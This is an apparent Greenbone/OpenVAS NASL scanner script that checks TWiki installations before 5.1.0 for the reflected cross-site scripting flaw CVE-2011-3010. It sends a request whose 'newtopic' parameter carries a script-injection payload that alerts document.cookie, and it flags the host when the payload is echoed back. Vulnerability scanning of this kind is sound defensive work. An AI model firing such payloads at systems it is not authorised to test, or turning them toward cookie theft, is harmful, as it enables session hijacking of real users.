# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:twiki:twiki";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802335");
  script_version("2025-03-06T05:38:27+0000");
  script_tag(name:"last_modification", value:"2025-03-06 05:38:27 +0000 (Thu, 06 Mar 2025)");
  script_tag(name:"creation_date", value:"2011-10-12 16:01:32 +0200 (Wed, 12 Oct 2011)");
  script_cve_id("CVE-2011-3010");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_name("TWiki < 5.1.0 'newtopic' Parameter and SlideShowPlugin XSS Vulnerabilities");

  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("gb_twiki_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("twiki/detected");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to inject arbitrary web script
  or HTML. This may allow the attacker to steal cookie-based authentication
  credentials and to launch other attacks.");

  script_tag(name:"affected", value:"TWiki version prior to 5.1.0.");

  script_tag(name:"insight", value:"Multiple flaws are due to input validation error in,

  - 'newtopic' parameter in bin/view/Main/Jump (when 'template' is set to
    'WebCreateNewTopic')

  - 'lib/TWiki/Plugins/SlideShowPlugin/SlideShow.pm' in the 'SlideShowPlugin'
    pages containing a slideshow presentation.");

  script_tag(name:"solution", value:"upgrade to TWiki 5.1.0 or later.");

  script_tag(name:"summary", value:"TWiki is prone to multiple cross-site scripting (XSS)
  vulnerabilities.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/46123");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49746");
  script_xref(name:"URL", value:"http://securitytracker.com/id?1026091");
  script_xref(name:"URL", value:"http://www.mavitunasecurity.com/xss-vulnerability-in-twiki5/");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  script_xref(name:"URL", value:"http://twiki.org/cgi-bin/view/Codev/DownloadTWiki");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! twikiPort = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:twikiPort ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = string(dir,"/view/Main/Jump?create=on&amp;newtopic='" +
            '"--></style></script><script>alert(document.cookie)</script>' +
            '&amp;template=WebCreateNewTopic&amp;topicparent=3');

if(http_vuln_check(port:twikiPort, url:url,pattern:"</style></script>" +
          "<script>alert\(document.cookie\)</script>",extra_check:"TWiki", check_header:TRUE))
{
  report = http_report_vuln_url( port:twikiPort, url:url );
  security_message(port:twikiPort, data:report);
  exit(0);
}

exit(99);
